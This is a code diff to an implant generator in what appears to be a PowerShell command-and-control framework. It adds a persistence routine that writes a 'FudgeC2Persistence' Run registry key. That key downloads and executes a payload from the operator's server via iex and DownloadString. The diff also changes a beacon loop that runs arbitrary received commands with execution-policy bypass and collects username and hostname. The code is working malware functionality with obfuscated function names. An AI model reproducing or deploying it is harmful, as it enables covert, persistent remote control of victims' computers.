@@ -13,10 +13,13 @@ class ImplantGenerator:
                            "obf_remote_play_audio": "RemotePlayAudio",
                            "obf_sleep": "sleep",
                            "obf_start_sleep": "start_sleep",
-                           "obf_collect_sysinfo": "collect_sysinfo",
+                           "obf_collect_sysinfo": "collect-sysinfo",
                            "obf_http_conn": "http-connection",
                            "obf_https_conn": "https-connection",
-                           "obf_dns_conn": "dns-connection"
+                           "obf_dns_conn": "dns-connection",
+                           "obf_create_persistence": "create-persistence",
+                           "obf_builtin_command":"builtin-commands",
+                           "obf_reg_key_name": "FudgeC2Persistence"
                            }
 
     play_audio = '''
@@ -29,25 +32,32 @@ function {{ ron.obf_remote_play_audio }} {
 function aaaaaa() {}
     '''
     fde_func_b = '''
-function bbbbbb(){
+function {{ ron.obf_collect_sysinfo }}(){
     $hostN = hostname
     $final_str = $env:UserName+"::"+$hostN
     $Script:tr = $final_str
     write-output $Script:tr
+    return $final_str
 }
     '''
 
+
     update_implant = '''
-function {{ ron.obf_collect_sysinfo }} ($a) {
+function {{ ron.obf_builtin_command }} ($a) {
+    $Script:tr = ""
     $b=($a -split "::")
     if ($b -Like " sys_info") {
-        write-output "collecting sys_info"
-        bbbbbb(0)
+        return {{ ron.obf_collect_sysinfo }}(0)
+    } elseif ($b -Like " enable_persistence") {
+        {{ ron.obf_create_persistence }}
+        $result = "Success"
     } else {
-        Write-Output $b
+        $result = "Error"
+        $Script:tr = "Fudge: Error."
     }
+    return $result
 }
-        '''
+    '''
     random_function = '''
 function {{ ron.rnd_function }} () {}
         '''
@@ -89,11 +99,28 @@ function {{ ron.obf_https_conn }}(){
     '''
     start_sleep = '''
 function {{ ron.obf_start_sleep }}($a){
-    sleep (Get-Random -Minimum ($a *0.90) -Maximum ($a *1.05))
+    write-output "sleep"
+    sleep (Get-Random -Minimum ($a *0.90) -Maximum ($a *1.10))
+}
+    '''
+
+    create_persistence = '''
+function {{ ron.obf_create_persistence }}(){
+    write-output "persistence"
+    $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
+    $key = Get-Item -LiteralPath $abc -ErrorAction SilentlyContinue
+    $val = "powershell.exe -c (iex ((New-Object Net.WebClient).DownloadString('http://{{ url }}:{{ http_port }}/robots.txt?user={{ stager_key }}')))"
+    if ($key.Property -Like "{{ ron.obf_reg_key_name }}"){
+        $a = 0; 
+    } else {
+        New-ItemProperty -Path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String"
+    }
+    $Script:tr = "Enabled"
 }
     '''
 
     implant_main = '''
+write-output "start."
 start-sleep({{ initial_sleep }})
 ${{ ron.obf_sleep }}={{ beacon }}
 $sgep = "{{url}}"
@@ -110,7 +137,7 @@ while($true){
     if ( $headers -NotLike "=="){
         write-output "Non-sleep value"
         if ( $headers.Substring(0,2) -Like "::") {
-            {{ ron.obf_collect_sysinfo }}($headers)
+            {{ ron.obf_builtin_command }}($headers)
         } else {
             $tr = powershell.exe -exec bypass -C "$headers"
         }
@@ -153,7 +180,8 @@ while($true){
                              self.update_implant,
                              self.fde_func_a,
                              self.fde_func_b,
-                             self.start_sleep]
+                             self.start_sleep,
+                             self.create_persistence]
 
         # Checks which protocols should be embedded into the implant.
         if implant_data['comms_http'] is not None:
@@ -198,6 +226,7 @@ while($true){
             https_port=implant_data['comms_https'],
             dns_port=implant_data['comms_dns'],
             uii=implant_data['unique_implant_id'],
+            stager_key=implant_data['stager_key'],
             ron=implant_function_names,
             beacon=implant_data['beacon'],
             proto_core=protocol_switch
